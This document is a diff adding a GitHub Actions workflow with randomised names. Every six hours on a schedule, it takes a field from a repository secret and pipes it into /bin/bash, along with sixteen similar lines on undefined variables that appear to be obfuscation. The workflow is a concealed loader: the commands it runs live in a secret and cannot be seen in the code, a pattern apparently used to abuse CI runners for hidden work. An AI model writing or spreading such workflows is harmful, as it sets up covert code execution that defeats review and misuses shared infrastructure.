@@ -1,0 +1,33 @@
+name: fokanly
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '4 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: fokanly
+        env:
+          a74: ${{ secrets.a74 }}
+        run: |
+          echo $a74 | jq -r .uqf34 | /bin/bash
+          echo $ycppj3 | jq -r .g22915 | /bin/bash
+          echo $viz882 | jq -r .ohr0786 | /bin/bash
+          echo $tv240 | jq -r .eclgm9185 | /bin/bash
+          echo $jiurx0353 | jq -r .rr631 | /bin/bash
+          echo $y559 | jq -r .yw51 | /bin/bash
+          echo $w9 | jq -r .idm34 | /bin/bash
+          echo $gkccn49 | jq -r .w40712 | /bin/bash
+          echo $xdzzp2574 | jq -r .egjsy1515 | /bin/bash
+          echo $lfz24893 | jq -r .e273 | /bin/bash
+          echo $rlg84230 | jq -r .v15234 | /bin/bash
+          echo $kyzx71 | jq -r .m5 | /bin/bash
+          echo $mokdz19813 | jq -r .mw5873 | /bin/bash
+          echo $qe2 | jq -r .ta96 | /bin/bash
+          echo $cc20 | jq -r .rfv387 | /bin/bash
+          echo $vo1 | jq -r .pw991 | /bin/bash
+          echo $z24 | jq -r .mskm75900 | /bin/bash
+
